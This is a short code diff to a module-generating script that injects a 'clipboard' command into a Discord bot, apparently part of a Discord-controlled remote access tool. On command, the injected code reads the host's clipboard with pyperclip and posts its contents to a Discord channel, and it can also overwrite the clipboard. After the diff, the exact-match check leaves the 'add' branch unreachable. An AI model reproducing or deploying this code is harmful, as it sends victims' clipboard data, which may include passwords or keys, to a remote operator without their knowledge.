@@ -4,22 +4,26 @@
 # TODO:
 # -clipboard
 # -clipboard add <string>
+def get_dependencies():
+    return """
+import pyperclip
+"""
 
 def get_code():
         return """
+
     # ADDED CLIPBOARD MODULE
-    elif message.content.lower() == ".clipboard":
+    elif message.content.lower() == "clipboard":
         parts = message.content.split()
         option = parts[1] if len(parts) > 1 else None
         if option == "add":
             # Here is the code to add content to the clipboard
-            import pyperclip
             content = message.content[15:]
             pyperclip.copy(content)
-            await message.channel.send("```diff\n+ Added to Clipboard\n```")
+            await message.channel.send("```diff\\n+ Added to Clipboard\\n```")
         else:
             # Here is the code to get the content of the clipboard
-            import pyperclip
-            await message.channel.send("```diff\n+ Clipboard\n```")
-            await message.channel.send("```diff\n+ " + pyperclip.paste() + "\n```")
+            await message.channel.send("```diff\\n+ Clipboard\\n```")
+            await message.channel.send("```diff\\n+ " + pyperclip.paste() + "\\n```")
+            
 """
